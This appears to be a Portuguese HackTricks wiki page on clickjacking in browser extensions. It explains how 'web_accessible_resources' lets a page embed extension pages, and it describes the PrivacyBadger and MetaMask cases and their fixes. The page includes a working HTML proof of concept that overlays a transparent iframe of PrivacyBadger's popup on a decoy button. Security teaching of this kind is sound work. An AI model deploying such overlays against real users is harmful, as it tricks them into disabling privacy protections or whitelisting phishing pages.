# BrowExt - ClickJacking

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** üí¨ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## Informa√ß√µes B√°sicas

Esta p√°gina vai explorar uma vulnerabilidade de ClickJacking em uma extens√£o de navegador.\
Se voc√™ n√£o sabe o que √© ClickJacking, confira:

{% content-ref url="../clickjacking.md" %}
[clickjacking.md](../clickjacking.md)
{% endcontent-ref %}

As extens√µes cont√™m o arquivo **`manifest.json`** e esse arquivo JSON tem um campo `web_accessible_resources`. Aqui est√° o que [a documenta√ß√£o do Chrome](https://developer.chrome.com/extensions/manifest/web\_accessible\_resources) diz sobre isso:

> Esses recursos estariam ent√£o dispon√≠veis em uma p√°gina da web via a URL **`chrome-extension://[PACKAGE ID]/[PATH]`**, que pode ser gerada com o **`extension.getURL method`**. Recursos permitidos s√£o servidos com cabe√ßalhos CORS apropriados, ent√£o est√£o dispon√≠veis via mecanismos como XHR.[1](https://blog.lizzie.io/clickjacking-privacy-badger.html#fn.1)

Os **`web_accessible_resources`** em uma extens√£o de navegador n√£o s√£o apenas acess√≠veis via a web; eles tamb√©m operam com os privil√©gios inerentes da extens√£o. Isso significa que eles t√™m a capacidade de:

* Mudar o estado da extens√£o
* Carregar recursos adicionais
* Interagir com o navegador at√© certo ponto

No entanto, esse recurso apresenta um risco de seguran√ßa. Se um recurso dentro de **`web_accessible_resources`** tiver alguma funcionalidade significativa, um atacante poderia potencialmente incorporar esse recurso em uma p√°gina da web externa. Usu√°rios desavisados que visitam essa p√°gina podem inadvertidamente ativar esse recurso incorporado. Tal ativa√ß√£o pode levar a consequ√™ncias indesejadas, dependendo das permiss√µes e capacidades dos recursos da extens√£o.

## Exemplo PrivacyBadger

Na extens√£o PrivacyBadger, uma vulnerabilidade foi identificada relacionada ao diret√≥rio `skin/` sendo declarado como `web_accessible_resources` da seguinte maneira (Confira o [post original do blog](https://blog.lizzie.io/clickjacking-privacy-badger.html)):
```json
"web_accessible_resources": [
"skin/*",
"icons/*"
]
```
Esta configura√ß√£o levou a um potencial problema de seguran√ßa. Especificamente, o arquivo `skin/popup.html`, que √© renderizado ao interagir com o √≠cone do PrivacyBadger no navegador, poderia ser incorporado dentro de um `iframe`. Essa incorpora√ß√£o poderia ser explorada para enganar os usu√°rios a clicarem inadvertidamente em "Desativar PrivacyBadger para este Site". Tal a√ß√£o comprometeria a privacidade do usu√°rio ao desativar a prote√ß√£o do PrivacyBadger e potencialmente sujeitar o usu√°rio a um rastreamento aumentado. Uma demonstra√ß√£o visual dessa explora√ß√£o pode ser vista em um exemplo de v√≠deo de ClickJacking fornecido em [**https://blog.lizzie.io/clickjacking-privacy-badger/badger-fade.webm**](https://blog.lizzie.io/clickjacking-privacy-badger/badger-fade.webm).

Para resolver essa vulnerabilidade, uma solu√ß√£o simples foi implementada: a remo√ß√£o de `/skin/*` da lista de `web_accessible_resources`. Essa mudan√ßa mitigou efetivamente o risco, garantindo que o conte√∫do do diret√≥rio `skin/` n√£o pudesse ser acessado ou manipulado atrav√©s de recursos acess√≠veis pela web.

A corre√ß√£o foi f√°cil: **remover `/skin/*` dos `web_accessible_resources`**.

### PoC
```html
<!--https://blog.lizzie.io/clickjacking-privacy-badger.html-->

<style>
iframe {
width: 430px;
height: 300px;
opacity: 0.01;
float: top;
position: absolute;
}

#stuff {
float: top;
position: absolute;
}

button {
float: top;
position: absolute;
top: 168px;
left: 100px;
}

</style>

<div id="stuff">
<h1>
Click the button
</h1>
<button id="button">
click me
</button>
</div>

<iframe src="chrome-extension://ablpimhddhnaldgkfbpafchflffallca/skin/popup.html">
</iframe>
```
## Exemplo Metamask

Um [**post de blog sobre um ClickJacking no metamask pode ser encontrado aqui**](https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9). Neste caso, o Metamask corrigiu a vulnerabilidade verificando se o protocolo usado para acess√°-lo era **`https:`** ou **`http:`** (n√£o **`chrome:`** por exemplo):

<figure><img src="../../.gitbook/assets/image (21).png" alt=""><figcaption></figcaption></figure>

**Outro ClickJacking corrigido** na extens√£o Metamask foi que os usu√°rios podiam **Clicar para adicionar √† lista de permiss√µes** quando uma p√°gina era suspeita de phishing por causa de `‚Äúweb_accessible_resources‚Äù: [‚Äúinpage.js‚Äù, ‚Äúphishing.html‚Äù]`. Como essa p√°gina era vulner√°vel ao Clickjacking, um atacante poderia abusar dela mostrando algo normal para fazer a v√≠tima clicar para adicion√°-la √† lista de permiss√µes sem perceber, e ent√£o voltar para a p√°gina de phishing que ser√° adicionada √† lista de permiss√µes.

## Exemplo Steam Inventory Helper

Verifique a p√°gina a seguir para ver como um **XSS** em uma extens√£o de navegador foi encadeado com uma vulnerabilidade de **ClickJacking**:

{% content-ref url="browext-xss-example.md" %}
[browext-xss-example.md](browext-xss-example.md)
{% endcontent-ref %}

## Refer√™ncias

* [https://blog.lizzie.io/clickjacking-privacy-badger.html](https://blog.lizzie.io/clickjacking-privacy-badger.html)
* [https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9](https://slowmist.medium.com/metamask-clickjacking-vulnerability-analysis-f3e7c22ff4d9)

{% hint style="success" %}
Aprenda e pratique Hacking AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprenda e pratique Hacking GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Confira os [**planos de assinatura**](https://github.com/sponsors/carlospolop)!
* **Junte-se ao** üí¨ [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-nos no **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Compartilhe truques de hacking enviando PRs para os reposit√≥rios do** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
{% endhint %}
